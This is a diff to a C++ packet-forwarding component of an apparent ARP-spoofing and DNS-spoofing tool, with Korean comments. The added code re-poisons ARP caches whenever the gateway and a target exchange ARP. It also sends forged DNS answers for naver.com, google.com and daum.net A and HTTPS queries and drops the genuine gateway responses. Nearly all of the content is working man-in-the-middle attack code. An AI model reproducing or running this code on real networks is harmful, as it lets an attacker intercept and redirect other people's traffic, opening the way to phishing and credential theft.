@@ -18,7 +18,7 @@ using namespace std;
  * ARP 패킷 일 경우, Target IP 여부 확인 후, ARP 재전송 로직 필요
 */
 
-PacketForwarder::PacketForwarder(pcap_t* handle, const ArpSpoofer* spoofer)
+PacketForwarder::PacketForwarder(pcap_t* handle, ArpSpoofer* spoofer)
     : handle(handle), spoofer(spoofer), running(false) {}
 
 PacketForwarder::~PacketForwarder() {
@@ -62,8 +62,34 @@ void PacketForwarder::forward_loop()
         
         if (ntohs(eth->ether_type) == ETHERTYPE_ARP) 
         {
-            // ARP 패킷 일 경우, Target IP 여부 확인 후 , ARP 재전송 로직 작성 필요
-        } 
+            struct arp_header* arp = (struct arp_header*)(packet_data + sizeof(struct ether_header));
+
+            const u_int8_t* sender_ip = arp->spa;
+            const u_int8_t* target_ip = arp->tpa;
+
+            // gateway 또는 target IP로의 ARP 요청인지 확인
+            bool involves_gateway = ip_equals(sender_ip, spoofer->get_gateway_ip()) || ip_equals(target_ip, spoofer->get_gateway_ip());
+            bool involves_target = false;
+
+            for (const auto& target : spoofer->get_targets()) 
+            {
+                if (ip_equals(sender_ip, target->get_ip()) || ip_equals(target_ip, target->get_ip())) 
+                {
+                    involves_target = true;
+                    break;
+                }
+            }
+
+            if (involves_gateway && involves_target) 
+            {
+                cout << "[ARP 요청] 게이트웨이 <-> 타겟 간 ARP 요청 감지. 스푸핑 ARP 재전송.\n";
+                for (const auto& target : spoofer->get_targets()) 
+                {
+                    spoofer->send_arp_spoofing_packet(target.get());
+                }
+            }
+        }
+
         else if (ntohs(eth->ether_type) == ETHERTYPE_IP) 
         {
             if (is_spoofed_packet(packet_data, header->len))
@@ -157,92 +183,60 @@ void PacketForwarder::forward_packet(const u_int8_t* packet_data, size_t packet_
             udp_header* udp = (udp_header*)(new_packet + sizeof(struct ether_header) + ip_header_len);
             u_int16_t sport = ntohs(udp->uh_sport);
             u_int16_t dport = ntohs(udp->uh_dport);
-            
+
             // DNS 요청 (클라이언트 -> 서버)
             if (dport == DNS_PORT && !ip_equals(src_ip, spoofer->get_gateway_ip())) 
             {
                 uint8_t* dns_ptr = (uint8_t*)(new_packet + sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
                 size_t dns_len = packet_len - (sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
                 string domain = extract_domain_name(dns_ptr, dns_len);
-                
-                // 도메인 정규화 (혹시 뒤에 이상한 값'.'이 있다면 삭제)
-                for (size_t i = 0; i < domain.size(); ++i) 
+
+                for (size_t i = 0; i < domain.size(); ++i) domain[i] = tolower(domain[i]);
+                if (!domain.empty() && domain.back() == '.') domain.pop_back();
+
+                bool should_spoof = (domain.find("naver.com") != string::npos || 
+                                     domain.find("google.com") != string::npos || 
+                                     domain.find("daum.net") != string::npos);
+
+                uint8_t* qptr = dns_ptr + 12;
+                while (*qptr != 0 && qptr < dns_ptr + dns_len) qptr += (*qptr) + 1;
+                qptr++;
+                uint16_t qtype = ntohs(*(uint16_t*)qptr);
+
+                if (should_spoof && (qtype == 1 || qtype == 65)) // A 또는 HTTPS 레코드 요청
                 {
-                    domain[i] = tolower(domain[i]);
-                }
-                if (!domain.empty() && domain.back() == '.')
-                {
-                    domain.pop_back();
-                }   
-                bool should_spoof = (domain == "www.naver.com" || 
-                                     domain == "www.google.com" || 
-                                     domain == "www.daum.net");
-                /** TODO 
-                 * 추가 도메인 정규화 진행, 현재 A "도메인" 형태의 패킷만 검사중
-                 * HTTPS "도메인" , CNAME "도메인" 형태의 패킷도 추가로 검사 후 DROP 필요
-                 */
-                if (should_spoof) 
-                {
-                    cout << "스푸핑 대상 도메인: " << domain << endl;
-                    
-                    // 스푸핑된 응답 전송
                     send_dns_spoof_response(handle, new_packet, packet_len,
                         spoofer->get_attacker_mac(), spoofer->get_gateway_ip(),
                         domain, spoofer->get_targets());
-                    
-                    // 원본 요청은 드롭하여 실제 서버에 도달하지 않도록 함
-                    cout << "DNS 요청 패킷 (" << domain << ") DROP." << endl;
+
+                    cout << "DNS 요청 패킷 (" << domain << ") DROP.\n";
                     delete[] new_packet;
                     return;
                 }
             }
+
             // DNS 응답 (서버 -> 클라이언트)
             else if (sport == DNS_PORT && ip_equals(src_ip, spoofer->get_gateway_ip())) 
             {
                 uint8_t* dns_ptr = (uint8_t*)(new_packet + sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
                 size_t dns_len = packet_len - (sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
-                
-                // 최소한의 헤더 체크 (응답 플래그가 설정된 경우)
+
                 if (dns_len >= sizeof(dns_header)) 
                 {
                     dns_header* dns_hdr = (dns_header*)dns_ptr;
-                    
-                    // 응답 플래그 확인 (0x8000)
                     if ((ntohs(dns_hdr->flags) & 0x8000)) 
                     {
                         string domain = extract_domain_name(dns_ptr, dns_len);
-                        cout << "DNS 응답 도메인 추출: " << domain << "\n";
-                        
-                        // 도메인 정규화
-                        for (size_t i = 0; i < domain.size(); ++i) 
-                        {
-                            domain[i] = tolower(domain[i]);
-                        }
+                        for (size_t i = 0; i < domain.size(); ++i) domain[i] = tolower(domain[i]);
+                        if (!domain.empty() && domain.back() == '.') domain.pop_back();
 
-                        if (!domain.empty() && domain.back() == '.')
-                        {
-                            domain.pop_back();
-                        }
-                        
-                        /** TODO 
-                         * 추가 도메인 정규화 진행, 현재 A "도메인" 형태의 패킷만 검사중
-                         * HTTPS "도메인" , CNAME "도메인" 형태의 패킷도 추가로 검사 후 DROP 필요
-                         */
-
-                        // 더 넓은 범위로 체크 (서브 도메인 포함)
-                        if (domain.find("naver.com") != std::string::npos ||
-                            domain.find("pstatic.net") != std::string::npos || 
-                            domain.find("google.com") != std::string::npos ||
-                            domain.find("gstatic.com") != std::string::npos || 
-                            domain.find("daum.net") != std::string::npos) 
+                        if (domain.find("naver.com") != string::npos ||
+                            domain.find("google.com") != string::npos ||
+                            domain.find("daum.net") != string::npos) 
                         {
                             cout << "게이트웨이 DNS 응답 (" << domain << ") DROP." << endl;
                             delete[] new_packet;
                             return;
-                        }
-                        else 
-                        {
-                            cout << "게이트웨이 DNS 응답 (" << domain << ") ALLOW." << endl;
                         }
                     }
                 }
@@ -263,3 +257,4 @@ void PacketForwarder::forward_packet(const u_int8_t* packet_data, size_t packet_
 
     delete[] new_packet;
 }
+
